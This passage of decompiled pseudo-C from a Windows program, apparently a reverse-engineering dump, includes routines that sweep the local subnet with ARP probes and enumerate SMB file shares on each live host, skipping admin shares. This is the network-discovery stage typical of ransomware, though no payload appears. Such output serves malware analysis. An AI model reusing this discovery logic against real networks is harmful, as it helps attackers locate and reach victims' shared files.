  volatile signed __int32 *v3; // ecx
  volatile signed __int32 *v4; // esi

  v2 = (_DWORD *)this[8];
  if ( v2 )
  {
    if ( (unsigned int)(4 * ((this[10] - (int)v2) >> 2)) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_44775B(v2);
    this[8] = 0;
    this[9] = 0;
    this[10] = 0;
  }
  v3 = (volatile signed __int32 *)this[3];
  if ( v3 && !_InterlockedDecrement(v3 + 1) )
    (*(void (__thiscall **)(volatile signed __int32 *))(*v3 + 4))(v3);
  this[3] = 0;
  v4 = (volatile signed __int32 *)this[1];
  if ( v4 && !_InterlockedExchangeAdd(v4 + 1, 0xFFFFFFFF) )
  {
    (**(void (__thiscall ***)(volatile signed __int32 *))v4)(v4);
    if ( !_InterlockedDecrement(v4 + 2) )
      (*(void (__thiscall **)(volatile signed __int32 *))(*v4 + 4))(v4);
  }
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();

//----- (00407EE0) --------------------------------------------------------
_DWORD *__fastcall sub_407EE0(_DWORD *a1, int a2)
{
  int v4; // ecx
  _DWORD *result; // eax

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_5009C0,
          (int (__stdcall *)(void *, void *, void **))sub_40B320,
          &unk_5009A8) )
    terminate(v4);
  *a1 = a2;
  result = a1;
  a1[1] = &unk_5009A8;
  return result;
}
// 407F0F: variable 'v4' is possibly undefined
// 46203B: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (00407F20) --------------------------------------------------------
const char *__cdecl sub_407F20(int a1)
{
  const char *result; // eax

  switch ( a1 )
  {
    case 1:
      result = "broken promise";
      break;
    case 2:
      result = "future already retrieved";
      break;
    case 3:
      result = "promise already satisfied";
      break;
    case 4:
      result = "no state";
      break;
    default:
      result = 0;
      break;
  }
  return result;
}

//----- (00407F70) --------------------------------------------------------
const char *sub_407F70()
{
  return "future";
}

//----- (00407F80) --------------------------------------------------------
void **__stdcall sub_407F80(void **a1, int a2)
{
  char *v2; // edx
  void **result; // eax
  char *v4; // edx

  switch ( a2 )
  {
    case 1:
      v2 = "broken promise";
      goto LABEL_6;
    case 2:
      v2 = "future already retrieved";
      goto LABEL_6;
    case 3:
      v2 = "promise already satisfied";
      goto LABEL_6;
    case 4:
      v2 = "no state";
LABEL_6:
      a1[4] = 0;
      a1[5] = (void *)15;
      *(_BYTE *)a1 = 0;
      sub_40A390(a1, v2, strlen(v2));
      result = a1;
      break;
    default:
      v4 = (char *)std::_Syserror_map(a2);
      a1[4] = 0;
      a1[5] = (void *)15;
      *(_BYTE *)a1 = 0;
      sub_40A390(a1, v4, strlen(v4));
      result = a1;
      break;
  }
  return result;
}

//----- (00408040) --------------------------------------------------------
int __thiscall sub_408040(int *this)
{
  int v1; // ecx
  int result; // eax
  int (__cdecl ***v3)(int); // edx

  v1 = *this;
  if ( v1 )
  {
    result = _InterlockedExchangeAdd((volatile signed __int32 *)(v1 + 4), 0xFFFFFFFF);
    if ( !result )
    {
      v3 = *(int (__cdecl ****)(int))(v1 + 120);
      if ( v3 )
        return (**v3)(v1);
      else
        return (**(int (__thiscall ***)(int, int))v1)(v1, 1);
    }
  }
  return result;
}

//----- (004080B0) --------------------------------------------------------
_DWORD *__thiscall sub_4080B0(void *this, _DWORD *a2)
{
  int v2; // esi
  unsigned int v3; // ebx
  char *v4; // eax
  void *v5; // esi
  int v6; // esi
  void *v7; // ecx
  int v8; // ebx
  void (__stdcall ***v9)(int); // ecx
  __int64 *v10; // edi
  int v11; // ecx
  void (__thiscall ***v12)(_DWORD, int); // edx
  void (__stdcall ***v13)(int); // ecx
  int *v14; // esi
  char *v15; // edi
  _BYTE *v16; // ecx
  _DWORD *v17; // edi
  void *v18; // ecx
  void *v19; // eax
  char *v20; // ebx
  char *v21; // eax
  void *v22; // edx
  void *v23; // esi
  const struct std::error_code *v25; // eax
  void *Block[5]; // [esp+10h] [ebp-84h] BYREF
  unsigned int v27; // [esp+24h] [ebp-70h]
  int v28; // [esp+28h] [ebp-6Ch]
  void **v29; // [esp+2Ch] [ebp-68h]
  void *v30[3]; // [esp+30h] [ebp-64h] BYREF
  _DWORD *v31; // [esp+3Ch] [ebp-58h]
  int v32; // [esp+40h] [ebp-54h]
  unsigned int v33; // [esp+44h] [ebp-50h]
  char *v34; // [esp+48h] [ebp-4Ch]
  __int64 v35; // [esp+4Ch] [ebp-48h]
  int v36; // [esp+54h] [ebp-40h]
  void *Src[2]; // [esp+58h] [ebp-3Ch] BYREF
  int v38; // [esp+60h] [ebp-34h]
  __int64 v39; // [esp+64h] [ebp-30h] BYREF
  void *v40[2]; // [esp+6Ch] [ebp-28h] BYREF
  int v41; // [esp+74h] [ebp-20h]
  void *v42[2]; // [esp+78h] [ebp-1Ch] BYREF
  void *v43; // [esp+80h] [ebp-14h]
  int v44; // [esp+90h] [ebp-4h]

  v2 = (int)this;
  v32 = (int)this;
  v3 = 0;
  v33 = 0;
  v31 = a2;
  v40[0] = 0;
  v40[1] = 0;
  v41 = 0;
  v44 = 1;
  v42[0] = 0;
  v42[1] = 0;
  v43 = 0;
  *(_QWORD *)Src = 0i64;
  v38 = 0;
  sub_408810((int)Src);
  LOBYTE(v44) = 2;
  v4 = (char *)Src[0];
  v34 = (char *)Src[0];
  if ( Src[0] != Src[1] )
  {
    while ( 1 )
    {
      v39 = 0i64;
      LOBYTE(v44) = 3;
      v35 = 0i64;
      v36 = 0;
      sub_4055B0(Block, v4);
      v28 = v2;
      v29 = v40;
      LOBYTE(v44) = 4;
      v5 = operator new(0xB0u);
      v30[2] = v5;
      LOBYTE(v44) = 5;
      memset(v5, 0, 0xB0u);
      v6 = sub_40B8C0((int)v5, (__int128 *)Block);
      BYTE4(v35) = 0;
      LODWORD(v35) = v6;
      LOBYTE(v36) = 0;
      LOBYTE(v44) = 7;
      if ( v27 >= 8 )
      {
        v7 = Block[0];
        if ( 2 * v27 + 2 >= 0x1000 )
        {
          v7 = (void *)*((_DWORD *)Block[0] - 1);
          if ( (unsigned int)(Block[0] - v7 - 4) > 0x1F )
            goto LABEL_48;
        }
        sub_44775B(v7);
      }
      if ( !v6 )
      {
LABEL_47:
        v25 = (const struct std::error_code *)sub_407EE0(v30, 4);
        std::_Throw_future_error(v25);
      }
      LOBYTE(v36) = 1;
      _InterlockedIncrement((volatile signed __int32 *)(v6 + 4));
      v8 = v3 | 2;
      LODWORD(v39) = v6;
      BYTE4(v39) = 1;
      v33 = v8;
      LOBYTE(v44) = 8;
      if ( !_InterlockedExchangeAdd((volatile signed __int32 *)(v6 + 4), 0xFFFFFFFF) )
      {
        v9 = *(void (__stdcall ****)(int))(v6 + 120);
        if ( v9 )
          (**v9)(v6);
        else
          (**(void (__stdcall ***)(int))v6)(1);
      }
      LOBYTE(v44) = 3;
      v10 = (__int64 *)v42[1];
      if ( v42[1] == v43 )
      {
        sub_40A790((int)v42, (char *)v42[1], (char *)&v39);
        v6 = v39;
        goto LABEL_21;
      }
      LOBYTE(v44) = 9;
      *(_DWORD *)v42[1] = 0;
      if ( v10 == &v39 )
        goto LABEL_19;
      v11 = *(_DWORD *)v10;
      if ( !*(_DWORD *)v10 || _InterlockedExchangeAdd((volatile signed __int32 *)(v11 + 4), 0xFFFFFFFF) )
        goto LABEL_18;
      v12 = *(void (__thiscall ****)(_DWORD, int))(v11 + 120);
      if ( !v12 )
        break;
      (**v12)(v12, v11);
      *(_DWORD *)v10 = v6;
      v6 = 0;
      *((_BYTE *)v10 + 4) = 1;
      v42[1] = (char *)v42[1] + 8;
LABEL_21:
      v3 = v8 & 0xFFFFFFFD;
      v33 = v3;
      LOBYTE(v44) = 10;
      if ( v6 && !_InterlockedExchangeAdd((volatile signed __int32 *)(v6 + 4), 0xFFFFFFFF) )
      {
        v13 = *(void (__stdcall ****)(int))(v6 + 120);
        if ( v13 )
          (**v13)(v6);
        else
          (**(void (__stdcall ***)(int))v6)(1);
      }
      v4 = v34 + 24;
      LOBYTE(v44) = 2;
      v34 = v4;
      if ( v4 == Src[1] )
        goto LABEL_28;
      v2 = v32;
    }
    (**(void (__thiscall ***)(int, int))v11)(v11, 1);
LABEL_18:
    *(_DWORD *)v10 = v6;
    v6 = 0;
LABEL_19:
    *((_BYTE *)v10 + 4) = 1;
    v42[1] = (char *)v42[1] + 8;
    goto LABEL_21;
  }
LABEL_28:
  v14 = (int *)v42[0];
  v15 = (char *)v42[1];
  if ( v42[0] != v42[1] )
  {
    do
    {
      v16 = (_BYTE *)*v14;
      if ( !*v14 || *((_BYTE *)v14 + 4) && v16[108] )
        goto LABEL_47;
      (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)v16 + 4))(v16);
      v14 += 2;
    }
    while ( v14 != (int *)v15 );
    v14 = (int *)v42[0];
  }
  v17 = v31;
  v18 = 0;
  v19 = v40[0];
  v20 = (char *)Src[0];
  v40[0] = 0;
  *v31 = v19;
  v17[1] = v40[1];
  v17[2] = v41;
  v40[1] = 0;
  v41 = 0;
  if ( v20 )
  {
    sub_4047B0((int)v20, (int)Src[1]);
    v21 = v20;
    if ( (unsigned int)(24 * ((v38 - (int)v20) / 24)) >= 0x1000 )
    {
      v20 = (char *)*((_DWORD *)v20 - 1);
      if ( (unsigned int)(v21 - v20 - 4) > 0x1F )
        goto LABEL_48;
    }
    sub_44775B(v20);
    v18 = v40[0];
    v14 = (int *)v42[0];
  }
  if ( v14 )
  {
    sub_40AE60(v14, (int *)v42[1]);
    v22 = v42[0];
    if ( (((unsigned int)v43 - (unsigned int)v42[0]) & 0xFFFFFFF8) >= 0x1000 )
    {
      v22 = (void *)*((_DWORD *)v42[0] - 1);
      if ( (unsigned int)(v42[0] - v22 - 4) > 0x1F )
        goto LABEL_48;
    }
    sub_44775B(v22);
    v18 = v40[0];
    v42[0] = 0;
    v42[1] = 0;
    v43 = 0;
  }
  if ( v18 )
  {
    sub_4047B0((int)v18, (int)v40[1]);
    v23 = v40[0];
    if ( (unsigned int)(24 * ((signed int)(v41 - (unsigned int)v40[0]) / 24)) < 0x1000
      || (v23 = (void *)*((_DWORD *)v40[0] - 1), (unsigned int)(v40[0] - v23 - 4) <= 0x1F) )
    {
      sub_44775B(v23);
      return v17;
    }
LABEL_48:
    _invalid_parameter_noinfo_noreturn();
  }
  return v17;
}

//----- (00408480) --------------------------------------------------------
void __thiscall sub_408480(void *this, int a2)
{
  unsigned __int16 *v2; // ecx
  unsigned int v3; // edi
  unsigned int v4; // esi
  int v5; // eax
  unsigned int v6; // eax
  LPCWCH v7; // esi
  WCHAR *v8; // ecx
  int v9; // edi
  unsigned int v10; // eax
  char **v11; // eax
  char *v12; // ecx
  char **v13; // eax
  void *v14; // ecx
  char *v15; // edi
  WCHAR *v16; // edx
  int v17; // ecx
  WCHAR *v18; // eax
  bool v19; // cf
  WCHAR v20; // dx
  WCHAR v21; // si
  bool v22; // cc
  WCHAR v23; // dx
  void *v24; // eax
  _DWORD *v25; // edi
  char *v26; // esi
  unsigned __int64 v27; // kr00_8
  struct _Mtx_internal_imp_t *v28; // esi
  int v29; // eax
  int *v30; // eax
  _DWORD *v31; // ecx
  char *v32; // eax
  char *v33; // eax
  void *v34; // ecx
  void *Block[5]; // [esp+Ch] [ebp-80h] BYREF
  unsigned int v36; // [esp+20h] [ebp-6Ch]
  _Mtx_t v37; // [esp+24h] [ebp-68h]
  char *v38; // [esp+28h] [ebp-64h]
  unsigned int v39; // [esp+2Ch] [ebp-60h]
  void *v40; // [esp+30h] [ebp-5Ch]
  int v41; // [esp+34h] [ebp-58h]
  LPCWCH v42; // [esp+38h] [ebp-54h]
  _WORD *v43; // [esp+3Ch] [ebp-50h]
  void *v44[4]; // [esp+40h] [ebp-4Ch] BYREF
  int v45; // [esp+50h] [ebp-3Ch]
  unsigned int v46; // [esp+54h] [ebp-38h]
  WCHAR WideCharStr[8]; // [esp+58h] [ebp-34h] BYREF
  __int64 v48; // [esp+68h] [ebp-24h]
  void *Src[2]; // [esp+70h] [ebp-1Ch] BYREF
  int v50; // [esp+78h] [ebp-14h]
  int v51; // [esp+88h] [ebp-4h]

  v40 = this;
  v2 = (unsigned __int16 *)a2;
  v41 = 0;
  v42 = (LPCWCH)a2;
  v3 = *(_DWORD *)(a2 + 20);
  v4 = *(_DWORD *)(a2 + 16);
  if ( v3 >= 8 )
    v2 = *(unsigned __int16 **)a2;
  v5 = sub_40A9C0(v2, v4, (int)v2, (__int16 *)".", 1);
  if ( v5 == -1 )
    return;
  v45 = 0;
  v6 = v5 + 1;
  LOWORD(v44[0]) = 0;
  v46 = 7;
  if ( v4 < v6 )
    v6 = v4;
  v7 = v42;
  v8 = (WCHAR *)v42;
  if ( v3 >= 8 )
    v8 = *(WCHAR **)v42;
  sub_404330(v44, v8, v6);
  v9 = 1;
  v10 = 1;
  v51 = 0;
  v39 = 1;
  while ( 1 )
  {
    v11 = (char **)sub_406040((int)Block, v10);
    LOBYTE(v51) = 1;
    v12 = (char *)v44;
    if ( v46 >= 8 )
      v12 = (char *)v44[0];
    v13 = sub_40B080(v11, (int)v12, v12, v45);
    v48 = 0i64;
    v41 = v9 | 2;
    *(_OWORD *)WideCharStr = *(_OWORD *)v13;
    v48 = *((_QWORD *)v13 + 2);
    v13[4] = 0;
    v13[5] = (char *)7;
    *(_WORD *)v13 = 0;
    LOBYTE(v51) = 3;
    if ( v36 >= 8 )
    {
      v14 = Block[0];
      if ( 2 * v36 + 2 >= 0x1000 )
      {
        v14 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v14 - 4) > 0x1F )
          goto LABEL_53;
      }
      sub_44775B(v14);
    }
    v15 = *(char **)WideCharStr;
    v16 = (WCHAR *)v7;
    v17 = *((_DWORD *)v7 + 4);
    LOWORD(Block[0]) = 0;
    v18 = WideCharStr;
    if ( HIDWORD(v48) >= 8 )
      v18 = *(WCHAR **)WideCharStr;
    Block[4] = 0;
    v19 = *((_DWORD *)v7 + 5) < 8u;
    v36 = 7;
    v43 = v7;
    if ( !v19 )
    {
      v16 = *(WCHAR **)v7;
      v43 = *(_WORD **)v7;
    }
    if ( v17 == (_DWORD)v48 )
    {
      if ( !v17 )
        goto LABEL_41;
      v20 = *v16;
      v21 = *v18;
      if ( v20 >= *v18 )
      {
        v43 = (_WORD *)((char *)v43 - (int)v18);
        v22 = v20 <= v21;
        do
        {
          if ( !v22 )
            break;
          if ( v17 == 1 )
            goto LABEL_41;
          ++v18;
          --v17;
          v23 = *(_WORD *)((char *)v43 + (_DWORD)v18);
          v22 = v23 <= *v18;
        }
        while ( v23 >= *v18 );
      }
      v7 = v42;
    }
    if ( sub_408B10(WideCharStr, v7) )
    {
      v50 = 0;
      *(_QWORD *)Src = 0i64;
      sub_408CF0(Src, WideCharStr);
      LOBYTE(v51) = 4;
      v27 = *(_QWORD *)Src;
      v24 = (void *)HIDWORD(v27);
      v26 = (char *)v27;
      v25 = Src[0];
      v38 = (char *)Src[0];
      if ( Src[0] != Src[1] )
      {
        do
        {
          v37 = *(_Mtx_t *)v40;
          v28 = v37;
          v29 = _Mtx_lock(v37);
          if ( v29 )
            goto LABEL_52;
          LOBYTE(v51) = 5;
          v30 = (int *)*((_DWORD *)v40 + 1);
          v43 = v30;
          v31 = (_DWORD *)v30[1];
          if ( v31 == (_DWORD *)v30[2] )
          {
            sub_40A5F0(v30, v30[1], v25);
          }
          else
          {
            sub_4055B0(v31, v25);
            *((_DWORD *)v43 + 1) += 24;
          }
          LOBYTE(v51) = 6;
          v29 = _Mtx_unlock(v28);
          if ( v29 )
LABEL_52:
            std::_Throw_C_error(v29);
          LOBYTE(v51) = 4;
          v25 += 6;
          v24 = Src[1];
        }
        while ( v25 != Src[1] );
        v26 = v38;
      }
      LOBYTE(v51) = 3;
      if ( v26 )
      {
        sub_4047B0((int)v26, (int)v24);
        v32 = v26;
        if ( (unsigned int)(24 * ((v50 - (int)v26) / 24)) >= 0x1000 )
        {
          v26 = (char *)*((_DWORD *)v26 - 1);
          if ( (unsigned int)(v32 - v26 - 4) > 0x1F )
            goto LABEL_53;
        }
        sub_44775B(v26);
        Src[0] = 0;
        Src[1] = 0;
        v50 = 0;
      }
    }
    v15 = *(char **)WideCharStr;
LABEL_41:
    LOBYTE(v51) = 0;
    if ( HIDWORD(v48) >= 8 )
    {
      v33 = v15;
      if ( (unsigned int)(2 * HIDWORD(v48) + 2) >= 0x1000 )
      {
        v15 = (char *)*((_DWORD *)v15 - 1);
        if ( (unsigned int)(v33 - v15 - 4) > 0x1F )
          goto LABEL_53;
      }
      sub_44775B(v15);
    }
    v10 = v39 + 1;
    v39 = v10;
    if ( v10 > 0xFE )
      break;
    v7 = v42;
    v9 = v41;
  }
  if ( v46 >= 8 )
  {
    v34 = v44[0];
    if ( 2 * v46 + 2 >= 0x1000 )
    {
      v34 = (void *)*((_DWORD *)v44[0] - 1);
      if ( (unsigned int)(v44[0] - v34 - 4) > 0x1F )
LABEL_53:
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v34);
  }
}

//----- (00408810) --------------------------------------------------------
int __stdcall sub_408810(int a1)
{
  int v1; // esi
  struct hostent *v2; // eax
  char **h_addr_list; // ecx
  int v4; // esi
  char *v5; // eax
  void *v6; // ecx
  int v7; // eax
  unsigned int v8; // eax
  void *v9; // ecx
  int result; // eax
  struct in_addr v11; // [esp-4h] [ebp-2FCh]
  void *Block[4]; // [esp+Ch] [ebp-2ECh] BYREF
  int v13; // [esp+1Ch] [ebp-2DCh]
  unsigned int v14; // [esp+20h] [ebp-2D8h]
  struct hostent *v15; // [esp+24h] [ebp-2D4h]
  char **v16; // [esp+28h] [ebp-2D0h]
  int v17; // [esp+2Ch] [ebp-2CCh]
  struct WSAData WSAData; // [esp+30h] [ebp-2C8h] BYREF
  WCHAR WideCharStr[8]; // [esp+1C0h] [ebp-138h] BYREF
  __int64 v20; // [esp+1D0h] [ebp-128h]
  __int64 v21; // [esp+1D8h] [ebp-120h] BYREF
  int v22; // [esp+1E0h] [ebp-118h]
  char name[260]; // [esp+1E4h] [ebp-114h] BYREF
  int v24; // [esp+2F4h] [ebp-4h]

  v1 = a1;
  v17 = a1;
  v16 = (char **)a1;
  v21 = 0i64;
  v22 = 0;
  v24 = 0;
  memset(&WSAData, 0, sizeof(WSAData));
  if ( !WSAStartup(0x202u, &WSAData) )
  {
    memset(name, 0, sizeof(name));
    if ( gethostname(name, 260) != -1 )
    {
      v2 = gethostbyname(name);
      v15 = v2;
      if ( v2 )
      {
        h_addr_list = v2->h_addr_list;
        v4 = 0;
        if ( v2->h_length - 1 > 0 )
        {
          while ( 1 )
          {
            if ( !*h_addr_list )
              goto LABEL_23;
            v11 = *(struct in_addr *)*h_addr_list;
            v16 = h_addr_list + 1;
            v5 = inet_ntoa(v11);
            if ( v5 )
              break;
LABEL_21:
            if ( ++v4 >= v15->h_length - 1 )
              goto LABEL_23;
            h_addr_list = v16;
          }
          v13 = 0;
          v14 = 15;
          LOBYTE(Block[0]) = 0;
          sub_40A390(Block, v5, strlen(v5));
          LOBYTE(v24) = 1;
          sub_405DB0(WideCharStr, (const CHAR *)Block);
          LOBYTE(v24) = 3;
          if ( v14 >= 0x10 )
          {
            v6 = Block[0];
            if ( v14 + 1 >= 0x1000 )
            {
              v6 = (void *)*((_DWORD *)Block[0] - 1);
              if ( (unsigned int)(Block[0] - v6 - 4) > 0x1F )
LABEL_26:
                _invalid_parameter_noinfo_noreturn();
            }
            sub_44775B(v6);
          }
          v13 = 0;
          v14 = 15;
          LOBYTE(Block[0]) = 0;
          if ( (_DWORD)v20 && sub_408B10(WideCharStr, WideCharStr) )
          {
            v7 = HIDWORD(v21);
            if ( HIDWORD(v21) != v22 )
            {
              *(_DWORD *)(HIDWORD(v21) + 16) = 0;
              *(_DWORD *)(v7 + 20) = 0;
              *(_OWORD *)v7 = *(_OWORD *)WideCharStr;
              *(_QWORD *)(v7 + 16) = v20;
              v8 = 7;
              HIDWORD(v21) += 24;
              v20 = 0x700000000i64;
              WideCharStr[0] = 0;
              goto LABEL_17;
            }
            sub_404640((int *)&v21, SHIDWORD(v21), (int)WideCharStr);
          }
          v8 = HIDWORD(v20);
LABEL_17:
          LOBYTE(v24) = 0;
          if ( v8 >= 8 )
          {
            v9 = *(void **)WideCharStr;
            if ( 2 * v8 + 2 >= 0x1000 )
            {
              v9 = *(void **)(*(_DWORD *)WideCharStr - 4);
              if ( (unsigned int)(*(_DWORD *)WideCharStr - (_DWORD)v9 - 4) > 0x1F )
                goto LABEL_26;
            }
            sub_44775B(v9);
          }
          goto LABEL_21;
        }
LABEL_23:
        v1 = v17;
      }
    }
    WSACleanup();
  }
  result = v1;
  *(_QWORD *)v1 = v21;
  *(_DWORD *)(v1 + 8) = v22;
  return result;
}

//----- (00408B10) --------------------------------------------------------
bool __stdcall sub_408B10(LPCWCH lpWideCharStr, LPCWCH a2)
{
  const char *v2; // eax
  unsigned int v3; // eax
  const char *v4; // ecx
  IPAddr v5; // edi
  unsigned int v6; // eax
  bool v7; // bl
  char *v8; // ecx
  char *v9; // ecx
  char *v11; // ecx
  char *v12; // ecx
  char *v13[5]; // [esp+10h] [ebp-4Ch] BYREF
  unsigned int v14; // [esp+24h] [ebp-38h]
  ULONG PhyAddrLen; // [esp+28h] [ebp-34h] BYREF
  char *cp[4]; // [esp+2Ch] [ebp-30h] BYREF
  int v17; // [esp+3Ch] [ebp-20h]
  unsigned int v18; // [esp+40h] [ebp-1Ch]
  int pMacAddr[6]; // [esp+44h] [ebp-18h] BYREF

  if ( !*((_DWORD *)lpWideCharStr + 4) || !*((_DWORD *)a2 + 4) )
    return 0;
  sub_405EF0(v13, lpWideCharStr);
  pMacAddr[5] = 0;
  sub_405EF0(cp, a2);
  if ( v13[4] && v17 )
  {
    v2 = (const char *)cp;
    if ( v18 >= 0x10 )
      v2 = cp[0];
    pMacAddr[0] = 255;
    pMacAddr[1] = 255;
    PhyAddrLen = 6;
    v3 = inet_addr(v2);
    v4 = (const char *)v13;
    v5 = v3;
    if ( v14 >= 0x10 )
      v4 = v13[0];
    v6 = inet_addr(v4);
    v7 = SendARP(v6, v5, pMacAddr, &PhyAddrLen) == 0;
    if ( v18 >= 0x10 )
    {
      v8 = cp[0];
      if ( v18 + 1 >= 0x1000 )
      {
        v8 = (char *)*((_DWORD *)cp[0] - 1);
        if ( (unsigned int)(cp[0] - v8 - 4) > 0x1F )
          goto LABEL_27;
      }
      sub_44775B(v8);
    }
    v17 = 0;
    v18 = 15;
    LOBYTE(cp[0]) = 0;
    if ( v14 < 0x10 )
      return v7;
    v9 = v13[0];
    if ( v14 + 1 < 0x1000 || (v9 = (char *)*((_DWORD *)v13[0] - 1), (unsigned int)(v13[0] - v9 - 4) <= 0x1F) )
    {
      sub_44775B(v9);
      return v7;
    }
LABEL_27:
    _invalid_parameter_noinfo_noreturn();
  }
  if ( v18 >= 0x10 )
  {
    v11 = cp[0];
    if ( v18 + 1 >= 0x1000 )
    {
      v11 = (char *)*((_DWORD *)cp[0] - 1);
      if ( (unsigned int)(cp[0] - v11 - 4) > 0x1F )
        goto LABEL_28;
    }
    sub_44775B(v11);
  }
  v17 = 0;
  v18 = 15;
  LOBYTE(cp[0]) = 0;
  if ( v14 >= 0x10 )
  {
    v12 = v13[0];
    if ( v14 + 1 < 0x1000 || (v12 = (char *)*((_DWORD *)v13[0] - 1), (unsigned int)(v13[0] - v12 - 4) <= 0x1F) )
    {
      sub_44775B(v12);
      return 0;
    }
LABEL_28:
    _invalid_parameter_noinfo_noreturn();
  }
  return 0;
}

//----- (00408CF0) --------------------------------------------------------
_DWORD *__stdcall sub_408CF0(_DWORD *a1, LPWSTR servername)
{
  _DWORD *v2; // edi
  int v3; // eax
  LPWSTR v4; // esi
  int v5; // ecx
  int v6; // edx
  WCHAR *v7; // eax
  DWORD v8; // eax
  LPBYTE v9; // eax
  void *v10; // edx
  unsigned int v11; // edi
  void **v12; // ecx
  char *v13; // esi
  int v14; // edi
  int v15; // esi
  unsigned int v16; // eax
  const void *v17; // eax
  _DWORD *v18; // eax
  int v19; // esi
  void **v20; // eax
  _DWORD *v21; // eax
  int v22; // esi
  _DWORD *v23; // eax
  int v24; // esi
  __int128 v25; // xmm0
  __int64 v26; // xmm1_8
  int v27; // eax
  unsigned int v28; // edx
  void *v29; // ecx
  void *v30; // ecx
  void *v31; // ecx
  void *v32; // ecx
  char *v33; // eax
  _DWORD *result; // eax
  void *Block[4]; // [esp+Ch] [ebp-C0h] BYREF
  __int64 v36; // [esp+1Ch] [ebp-B0h]
  void *Src[5]; // [esp+24h] [ebp-A8h] BYREF
  unsigned int v38; // [esp+38h] [ebp-94h]
  void *v39[4]; // [esp+3Ch] [ebp-90h] BYREF
  __int64 v40; // [esp+4Ch] [ebp-80h]
  void *v41[4]; // [esp+54h] [ebp-78h] BYREF
  __int64 v42; // [esp+64h] [ebp-68h]
  _DWORD *v43; // [esp+6Ch] [ebp-60h]
  _DWORD *v44; // [esp+70h] [ebp-5Ch]
  int v45; // [esp+74h] [ebp-58h]
  DWORD v46; // [esp+78h] [ebp-54h]
  unsigned int v47; // [esp+7Ch] [ebp-50h]
  LPBYTE v48; // [esp+80h] [ebp-4Ch]
  unsigned int v49; // [esp+84h] [ebp-48h]
  LPBYTE bufptr; // [esp+88h] [ebp-44h] BYREF
  DWORD totalentries; // [esp+8Ch] [ebp-40h] BYREF
  DWORD resume_handle; // [esp+90h] [ebp-3Ch] BYREF
  void *v53[4]; // [esp+94h] [ebp-38h] BYREF
  int v54; // [esp+A4h] [ebp-28h]
  unsigned int v55; // [esp+A8h] [ebp-24h]
  DWORD entriesread; // [esp+ACh] [ebp-20h] BYREF
  __int64 v57; // [esp+B0h] [ebp-1Ch] BYREF
  int v58; // [esp+B8h] [ebp-14h]
  int v59; // [esp+C8h] [ebp-4h]

  v2 = a1;
  v3 = 0;
  v4 = servername;
  v49 = 0;
  v5 = 0;
  v6 = 0;
  v43 = a1;
  v44 = a1;
  v45 = (int)servername;
  v47 = 0;
  v57 = 0i64;
  v58 = 0;
  v59 = 0;
  if ( *((_DWORD *)servername + 4) )
  {
    bufptr = 0;
    entriesread = 0;
    totalentries = 0;
    resume_handle = 0;
    do
    {
      v7 = v4;
      if ( *((_DWORD *)v4 + 5) >= 8u )
        v7 = *(WCHAR **)v4;
      v8 = NetShareEnum(v7, 1u, &bufptr, 0xFFFFFFFF, &entriesread, &totalentries, &resume_handle);
      v44 = (_DWORD *)v8;
      if ( v8 && v8 != 234 )
        break;
      v9 = bufptr;
      v48 = bufptr;
      v46 = 1;
      if ( entriesread )
      {
        do
        {
          v10 = *(void **)v9;
          LOWORD(v53[0]) = 0;
          v54 = 0;
          v55 = 7;
          sub_404330(v53, v10, wcslen((const unsigned __int16 *)v10));
          v11 = v55;
          v12 = v53;
          v13 = (char *)v53[0];
          if ( v55 >= 8 )
            v12 = (void **)v53[0];
          if ( sub_40AB20((int)v12, v54, 0, (unsigned __int16 *)"$", 1u) == -1 )
          {
            v14 = v45;
            LOBYTE(v59) = 2;
            LOWORD(Src[0]) = 0;
            v15 = v47 | 2;
            v16 = *(_DWORD *)(v45 + 16) + 2;
            Src[4] = 0;
            v38 = 7;
            v49 = v47 | 2;
            sub_40AF10(Src, v16);
            sub_4044A0(Src, L"\\\\", 2u);
            v17 = (const void *)v14;
            if ( *(_DWORD *)(v14 + 20) >= 8u )
              v17 = *(const void **)v14;
            sub_4044A0(Src, v17, *(_DWORD *)(v14 + 16));
            v18 = sub_4044A0(Src, "\\", 1u);
            v40 = 0i64;
            v19 = v15 | 4;
            v49 = v19;
            *(_OWORD *)v39 = *(_OWORD *)v18;
            v40 = *((_QWORD *)v18 + 2);
            v18[4] = 0;
            v18[5] = 7;
            *(_WORD *)v18 = 0;
            LOBYTE(v59) = 3;
            v20 = v53;
            if ( v55 >= 8 )
              v20 = (void **)v53[0];
            v21 = sub_4044A0(v39, v20, v54);
            v42 = 0i64;
            v22 = v19 | 8;
            v49 = v22;
            *(_OWORD *)v41 = *(_OWORD *)v21;
            v42 = *((_QWORD *)v21 + 2);
            v21[4] = 0;
            v21[5] = 7;
            *(_WORD *)v21 = 0;
            LOBYTE(v59) = 4;
            v23 = sub_4044A0(v41, "\\", 1u);
            v24 = v22 | 0x10;
            v49 = v24;
            v25 = *(_OWORD *)v23;
            v26 = *((_QWORD *)v23 + 2);
            *(_OWORD *)Block = *(_OWORD *)v23;
            v23[4] = 0;
            v36 = v26;
            v23[5] = 7;
            *(_WORD *)v23 = 0;
            LOBYTE(v59) = 5;
            v27 = HIDWORD(v57);
            if ( HIDWORD(v57) == v58 )
            {
              sub_404640((int *)&v57, SHIDWORD(v57), (int)Block);
              v28 = HIDWORD(v36);
            }
            else
            {
              *(_DWORD *)(HIDWORD(v57) + 16) = 0;
              v28 = 7;
              *(_OWORD *)v27 = v25;
              *(_QWORD *)(v27 + 16) = v26;
              HIDWORD(v57) += 24;
              LOWORD(Block[0]) = 0;
            }
            LOBYTE(v59) = 4;
            if ( v28 >= 8 )
            {
              v29 = Block[0];
              if ( 2 * v28 + 2 >= 0x1000 )
              {
                v29 = (void *)*((_DWORD *)Block[0] - 1);
                if ( (unsigned int)(Block[0] - v29 - 4) > 0x1F )
LABEL_44:
                  _invalid_parameter_noinfo_noreturn();
              }
              sub_44775B(v29);
            }
            LOBYTE(v59) = 3;
            if ( HIDWORD(v42) >= 8 )
            {
              v30 = v41[0];
              if ( (unsigned int)(2 * HIDWORD(v42) + 2) >= 0x1000 )
              {
                v30 = (void *)*((_DWORD *)v41[0] - 1);
